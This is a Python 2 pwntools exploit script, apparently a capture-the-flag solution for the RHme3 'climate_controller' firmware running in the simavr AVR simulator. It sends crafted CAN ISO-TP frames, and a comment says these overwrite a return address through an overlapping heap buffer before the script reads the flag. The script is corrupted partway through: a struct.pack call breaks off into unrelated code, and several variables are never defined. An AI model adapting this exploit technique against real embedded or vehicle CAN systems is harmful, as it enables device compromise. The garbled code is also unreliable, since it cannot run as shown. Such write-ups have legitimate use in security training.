#!/usr/bin/python2
from pwn import *
def attack(connection, can):
    def sim_run():
        can.send(p8(0))
    def sim_run_few():
        for _ in xrange(1):
            sim_run()
            connection.recvuntil("MAIN_LOOP")
    def can_send_frame(ctrl, sid, eid, data):
        sim_run_few()
        can.send(p8(1))
        frame = struct.pack("> 8)) + p8(queue_content_size & 0xff) + chunk)
        sequence = 0
        chunk = reader.read(7)
        while chunk != b"":
            sequence += 1
            sequence &= 0x0f
            if reader.tell() == queue_content_size:
                can_send_frame(0, 0, 0, p8(0x10) + chunk)
            else:
                can_send_frame(0, 0, 0, p8(0x20 | sequence) + chunk)
            chunk = reader.read(7)
        # (2) Overwrite ret address from bigint_mul_u via overlapping heap buffer.
        reader = StringIO(certificate_data)
        chunk = reader.read(6)
        can_send_frame(0, 0x0776, 0, p8(0x10 | (certificate_content_size >> 8)) + p8(certificate_content_size & 0xff) + chunk)
        sequence = 0
        chunk = reader.read(7)
        while chunk != b"":
            sequence += 1
            sequence &= 0x0f
            can_send_frame(0, 0, 0, p8(0x20 | sequence) + chunk)
            chunk = reader.read(7)
    app_send_0776_certificate() 
    context.log_level = "debug"
    sim_run()
    connection.recvuntil("It's dangerous to go alone! take this.")
    flag = connection.recvn(0x20)
    info("flag = %s", flag)
can_local, can_remote = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
with process(["/mnt/rhme3/dev/simavr/simavr/run_avr", "-m", "atmega2560", "-f", "1000000", "climate_controller.hex"], env = {"P4_CAN_FD": str(can_remote.fileno())}, close_fds = False) as uart:
    attack(uart, can_local)